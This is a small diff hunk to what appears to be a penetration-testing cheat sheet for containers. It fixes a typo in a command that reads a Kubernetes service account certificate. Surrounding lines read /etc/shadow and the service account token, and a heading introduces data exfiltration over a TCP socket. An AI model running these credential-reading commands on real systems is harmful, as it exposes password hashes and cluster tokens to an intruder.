@@ -34,7 +34,7 @@ cat /etc/shadow
 ls /var/run/secrets/kubernetes.io/serviceaccount
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
 cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
-ca /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 ```
 
 ### Data Exfiltration via TCP Socket 👀
